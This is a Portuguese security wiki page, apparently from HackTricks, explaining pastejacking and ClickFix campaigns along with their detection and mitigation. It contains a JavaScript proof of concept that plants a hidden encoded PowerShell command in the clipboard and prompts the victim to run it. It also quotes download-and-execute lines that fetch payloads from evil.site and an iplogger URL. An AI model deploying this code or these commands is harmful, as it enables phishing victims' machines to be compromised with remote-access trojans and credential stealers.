# Ataques de Sequestro de Área de Transferência (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> "Nunca cole nada que você não copiou." – conselho antigo, mas ainda válido

## Visão Geral

O sequestro de área de transferência – também conhecido como *pastejacking* – explora o fato de que os usuários rotineiramente copiam e colam comandos sem inspecioná-los. Uma página da web maliciosa (ou qualquer contexto capaz de JavaScript, como um aplicativo Electron ou Desktop) insere programaticamente texto controlado pelo atacante na área de transferência do sistema. As vítimas são incentivadas, normalmente por instruções de engenharia social cuidadosamente elaboradas, a pressionar **Win + R** (diálogo Executar), **Win + X** (Acesso Rápido / PowerShell) ou abrir um terminal e *colar* o conteúdo da área de transferência, executando imediatamente comandos arbitrários.

Como **nenhum arquivo é baixado e nenhum anexo é aberto**, a técnica contorna a maioria dos controles de segurança de e-mail e conteúdo da web que monitoram anexos, macros ou execução direta de comandos. O ataque é, portanto, popular em campanhas de phishing que entregam famílias de malware comuns, como NetSupport RAT, carregador Latrodectus ou Lumma Stealer.

## Prova de Conceito em JavaScript
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Campanhas mais antigas usavam `document.execCommand('copy')`, enquanto as mais novas dependem da **Clipboard API** assíncrona (`navigator.clipboard.writeText`).

## O Fluxo ClickFix / ClearFake

1. O usuário visita um site com erro de digitação ou comprometido (por exemplo, `docusign.sa[.]com`)
2. O JavaScript **ClearFake** injetado chama um helper `unsecuredCopyToClipboard()` que armazena silenciosamente uma linha de comando PowerShell codificada em Base64 na área de transferência.
3. Instruções em HTML dizem à vítima: *“Pressione **Win + R**, cole o comando e pressione Enter para resolver o problema.”*
4. `powershell.exe` é executado, baixando um arquivo que contém um executável legítimo mais um DLL malicioso (sideloading clássico de DLL).
5. O loader descriptografa estágios adicionais, injeta shellcode e instala persistência (por exemplo, tarefa agendada) – executando, em última instância, NetSupport RAT / Latrodectus / Lumma Stealer.

### Exemplo de Cadeia NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart legítimo) procura seu diretório por `msvcp140.dll`.
* O DLL malicioso resolve dinamicamente APIs com **GetProcAddress**, baixa dois binários (`data_3.bin`, `data_4.bin`) via **curl.exe**, os descriptografa usando uma chave XOR rolante `"https://google.com/"`, injeta o shellcode final e descompacta **client32.exe** (NetSupport RAT) em `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Baixa `la.txt` com **curl.exe**
2. Executa o downloader JScript dentro do **cscript.exe**
3. Busca um payload MSI → solta `libcef.dll` ao lado de uma aplicação assinada → sideloading de DLL → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
A chamada **mshta** inicia um script PowerShell oculto que recupera `PartyContinued.exe`, extrai `Boat.pst` (CAB), reconstrói `AutoIt3.exe` através de `extrac32` e concatenação de arquivos e, finalmente, executa um script `.a3x` que exfiltra credenciais do navegador para `sumeriavgv.digital`.

## Detecção e Caça

As equipes azuis podem combinar telemetria de área de transferência, criação de processos e registro para identificar abusos de pastejacking:

* Registro do Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` mantém um histórico de comandos **Win + R** – procure por entradas Base64 / ofuscadas incomuns.
* ID de Evento de Segurança **4688** (Criação de Processo) onde `ParentImage` == `explorer.exe` e `NewProcessName` em { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* ID de Evento **4663** para criações de arquivos em `%LocalAppData%\Microsoft\Windows\WinX\` ou pastas temporárias logo antes do evento 4688 suspeito.
* Sensores de área de transferência EDR (se presentes) – correlacione `Clipboard Write` seguido imediatamente por um novo processo PowerShell.

## Mitigações

1. Fortalecimento do navegador – desative o acesso de gravação na área de transferência (`dom.events.asyncClipboard.clipboardItem` etc.) ou exija gesto do usuário.
2. Conscientização de segurança – ensine os usuários a *digitar* comandos sensíveis ou colá-los primeiro em um editor de texto.
3. Modo de Linguagem Constrangida do PowerShell / Política de Execução + Controle de Aplicativos para bloquear one-liners arbitrários.
4. Controles de rede – bloqueie solicitações de saída para domínios conhecidos de pastejacking e C2 de malware.

## Truques Relacionados

* O **Discord Invite Hijacking** frequentemente abusa da mesma abordagem ClickFix após atrair usuários para um servidor malicioso:
{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Referências

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)

{{#include ../../banners/hacktricks-training.md}}
